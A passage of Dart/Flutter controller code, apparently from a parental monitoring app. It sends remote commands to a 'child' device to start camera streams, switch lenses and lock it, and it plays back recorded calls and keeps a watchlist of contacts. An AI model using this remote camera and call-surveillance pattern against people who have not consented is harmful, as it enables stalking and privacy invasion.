        });
      } catch (e) {
        debugPrint("Could not dispatch lock command: $e");
      }
    }
    notifyListeners();
  }

  void toggleLiveScreen() {
    _isLiveScreenActive = !_isLiveScreenActive;
    if (_isLiveScreenActive) _isRemoteCameraActive = false;
    notifyListeners();
  }

  void toggleRemoteCamera() {
    _isRemoteCameraActive = !_isRemoteCameraActive;
    if (_isRemoteCameraActive) _isLiveScreenActive = false;
    try {
      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
        'action': _isRemoteCameraActive ? 'START_CAMERA_STREAM' : 'STOP_CAMERA_STREAM',
        'payload': {'lens': _currentCameraLens},
        'status': 'PENDING',
        'timestamp': FieldValue.serverTimestamp(),
      });
      debugPrint("Dispatched ${_isRemoteCameraActive ? 'START_CAMERA_STREAM' : 'STOP_CAMERA_STREAM'} to child");
    } catch (e) {
      debugPrint("Could not dispatch camera command: $e");
    }
    notifyListeners();
  }

  void switchCameraLens() {
    _currentCameraLens = (_currentCameraLens == "back") ? "front" : "back";
    if (_isRemoteCameraActive) {
      try {
        _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
          'action': 'SWITCH_CAMERA_LENS',
          'payload': {'lens': _currentCameraLens},
          'status': 'PENDING',
          'timestamp': FieldValue.serverTimestamp(),
        });
      } catch (e) {
        debugPrint("Could not dispatch lens switch: $e");
      }
    }
    notifyListeners();
  }

  void toggleFlashlight() {
    _isFlashlightOn = !_isFlashlightOn;
    notifyListeners();
  }

  Future<void> togglePlayAudio(String callId) async {
    final allCalls = callRecords;
    CallRecord? targetCall;
    for (final c in allCalls) {
      if (c.id == callId) {
        targetCall = c;
        break;
      }
    }

    if (AudioPlaybackService.instance.isPlaying && AudioPlaybackService.instance.currentMediaId == callId) {
      await AudioPlaybackService.instance.pause();
      _currentlyPlayingAudioId = null;
    } else {
      _currentlyPlayingAudioId = callId;
      if (targetCall != null && targetCall.recordingUrl != null && targetCall.recordingUrl!.isNotEmpty) {
        await AudioPlaybackService.instance.play(
          mediaId: callId,
          url: targetCall.recordingUrl,
        );
      }
    }
    notifyListeners();
  }

  Future<void> togglePlayAudioUrl(String mediaId, String url) async {
    if (AudioPlaybackService.instance.isPlaying && AudioPlaybackService.instance.currentMediaId == mediaId) {
      await AudioPlaybackService.instance.pause();
      _currentlyPlayingAudioId = null;
    } else {
      _currentlyPlayingAudioId = mediaId;
      await AudioPlaybackService.instance.play(
        mediaId: mediaId,
        url: url,
      );
    }
    notifyListeners();
  }

  void addWatchlistTarget(String name, String identifier, String note) {
    _childWatchlists.putIfAbsent(_activeChildId, () => []).add(
      WatchlistTarget(
        id: "target_${DateTime.now().millisecondsSinceEpoch}",
        name: name,
        identifier: identifier,
        note: note,
        isHighPriority: true,
        totalCalls: 0,
        totalChats: 0,
        lastInteracted: DateTime.now(),
      ),
    );
    notifyListeners();
  }

  @override
  void dispose() {
    _deviceSub?.cancel();
    _callsSub?.cancel();
    _chatsSub?.cancel();
    _notifsSub?.cancel();
    super.dispose();
  }
}
